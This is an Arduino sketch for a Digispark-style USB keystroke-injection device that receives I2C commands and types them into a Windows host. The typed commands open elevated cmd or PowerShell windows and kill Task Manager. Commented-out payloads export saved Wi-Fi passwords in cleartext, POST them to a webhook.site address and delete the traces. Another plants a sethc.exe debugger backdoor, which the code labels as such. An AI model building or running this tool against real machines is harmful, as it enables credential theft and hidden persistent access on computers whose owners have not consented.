#include <DigiKeyboard.h>
#include <TinyWireS.h>

#define S_ADDR 0x26
#define LED 1

uint8_t Brcv;
bool ctrl;
bool alt;
bool shift;
bool win;

void setup() {
  pinMode(LED, OUTPUT);
  digitalWrite(LED, HIGH);
  DigiKeyboard.sendKeyStroke(0);
  TinyWireS.begin(S_ADDR);
  digitalWrite(LED, LOW);
  flash(4, 25, 500);
}

void loop() {
  if (TinyWireS.available()){
    Brcv = TinyWireS.receive();

    if (Brcv < 0b00001000){
      if (Brcv == 0b00000000){
        DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
        DigiKeyboard.delay(200);
        DigiKeyboard.println("taskmgr");
        //任务管理器
      }
      if (Brcv == 0b00000001){
        DigiKeyboard.sendKeyStroke(KEY_F, MOD_ALT_LEFT);
        DigiKeyboard.sendKeyStroke(KEY_N);
        DigiKeyboard.delay(1000);
        DigiKeyboard.print("cmd /k mode con: cols=15 lines=1");//start cmd
        DigiKeyboard.sendKeyStroke(KEY_TAB);
        DigiKeyboard.sendKeyStroke(KEY_SPACE);//turn on admin privileges
        DigiKeyboard.sendKeyStroke(KEY_ENTER); //run
        DigiKeyboard.delay(500);
        DigiKeyboard.println("taskkill /IM \"taskmgr.exe\" /F ");//killing taskmanager
        //CMD
      }
      if (Brcv == 0b00000010){
        DigiKeyboard.sendKeyStroke(KEY_F, MOD_ALT_LEFT);
        DigiKeyboard.sendKeyStroke(KEY_N);
        DigiKeyboard.delay(1000);
        DigiKeyboard.print("powershell -noexit -command \"mode con cols=18 lines=1\"");//start cmd
        DigiKeyboard.sendKeyStroke(KEY_TAB);
        DigiKeyboard.sendKeyStroke(KEY_SPACE);//turn on admin privileges
        DigiKeyboard.sendKeyStroke(KEY_ENTER); //run
        DigiKeyboard.delay(3000);
        DigiKeyboard.println("taskkill /IM \"taskmgr.exe\" /F ");//killing taskmanager
        //POWERSHELL
      }


      if (Brcv == 0b00000100){
        // DigiKeyboard.println("cd %temp%");
        // DigiKeyboard.delay(300);
        // DigiKeyboard.println("netsh wlan export profile key=clear");
        // DigiKeyboard.delay(500);
        // DigiKeyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS");
        // DigiKeyboard.delay(500);
        // DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/<ADD-WEBHOOK-ADDRESS-HERE> -Method POST -InFile Wi-Fi-PASS");
        // DigiKeyboard.delay(500);
        // DigiKeyboard.println("del Wi-* /s /f /q");
        // DigiKeyboard.delay(500);
        // DigiKeyboard.println("exit");

        //WiFi
      }
      if (Brcv == 0b00000101){
        //DigiKeyboard.println(F("REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe\""));//adding backdoor
      }
      if (Brcv == 0b00000111){
        DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
      }
      //低三位表示组合键
    }
    else if (Brcv < 0b00010000){
      if (Brcv == 0b00001000){
        DigiKeyboard.sendKeyStroke(KEY_ARROW_UP);
      }
      if (Brcv == 0b00001001){
        DigiKeyboard.sendKeyStroke(KEY_ARROW_DOWN);
      }
      if (Brcv == 0b00001010){
        DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
      }
      if (Brcv == 0b00001011){
        DigiKeyboard.sendKeyStroke(KEY_ARROW_RIGHT);
      }
      if (Brcv == 0b00001100){
        DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);  //win
      }
      if (Brcv == 0b00001101){
        DigiKeyboard.sendKeyStroke(KEY_ENTER); //enter
      }
      if (Brcv == 0b00001110){
        DigiKeyboard.sendKeyStroke(KEY_BACKSPACE);  //backspace
      }
      if (Brcv == 0b00001111){
        DigiKeyboard.sendKeyStroke(KEY_DELETE);  //esc
      }
      //0000,1000-0000,1111为
      //上、下、左、右、...
    }

    else if (Brcv < 0b00100000){

    }
    else if (Brcv < 0b10000000){
      DigiKeyboard.print(Brcv);
    }
    else{
      
    }
    //flash(int(char(Brcv)) - 48, 200, 1000);
  }
}

void flash(int t, int delta, int looptime){
  for(int i=0; i < t; i++){
    digitalWrite(LED, HIGH);
    DigiKeyboard.delay(delta);
    digitalWrite(LED, LOW);
    DigiKeyboard.delay(delta);
  }
  DigiKeyboard.delay(looptime);
}
